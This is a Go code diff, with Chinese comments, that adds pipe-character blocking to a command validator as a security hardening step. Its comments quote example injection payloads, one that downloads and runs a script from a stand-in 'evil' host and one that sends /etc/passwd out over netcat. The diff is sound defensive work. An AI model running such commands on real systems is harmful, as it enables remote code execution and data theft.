@@ -46,8 +46,17 @@ const maxCommandLen = 4096
 // 校验项：
 //   - 非空（调用方应已校验，此处兜底）。
 //   - 长度 <= maxCommandLen（4096），防超长命令撑爆存储/日志或携带二进制载荷。
-//   - 不含危险 shell 元字符：换行符 \n \r、分号 ;、命令替换 $() `、单个 &（后台执行）。
-//     管道符 | 暂不拦截（与 agent 端策略一致，合法运维用途多）；如需拦截可在此扩展。
+//   - 不含危险 shell 元字符：换行符 \n \r、分号 ;、命令替换 $() `、单个 &（后台执行）、
+//     管道符 |（P0-2 安全加固：拦截管道符防 `curl evil/x | sh` 这类管道注入）。
+//   - 允许的合法模式：&&（命令链接符，第 81 行特殊处理）、>& / &>（重定向操作符）。
+//
+// 安全考量（P0-2 管道符拦截）：
+//   - 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh`、`cat /etc/passwd | nc evil 1234`
+//     等管道注入载荷可过校验。管道符是 shell 注入高频载体，控制面侧应默认拦截。
+//   - 合法运维场景极少需要在单条任务命令中使用管道（如需复合命令应拆分为多任务或用脚本）；
+//     若确有需求，可经审批后通过脚本任务（type=script）下发，而非 shell 单命令。
+//   - && 保留允许：作为合法命令链接符已在下方特殊处理（与 agent 端策略一致），
+//     且 && 短路语义不引入任意命令执行（左侧失败则右侧不执行，无管道的数据流注入风险）。
 //
 // 注意：这是纵深防御的第一道闸（控制面侧），不替代 agent 端 checkShellMetachars。
 // 两端均拦截可降低单点绕过风险：控制面被攻陷时 agent 端兜底，agent 端有 bug 时控制面侧兜底。
@@ -73,6 +82,11 @@ func validateCommand(command string) error {
 	}
 	if strings.Contains(command, "`") {
 		return errors.New("command contains backtick metacharacter: rejected")
+	}
+	// P0-2 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
+	// 原实现暂不拦截管道符，导致管道注入载荷可过校验；现已默认拦截。
+	if strings.Contains(command, "|") {
+		return errors.New("command contains pipe metacharacter ('|'): rejected")
 	}
 	// 检测单个 &（后台执行），允许合法模式 &&、>&、&>（与 agent 端逻辑一致）。
 	cmd := command
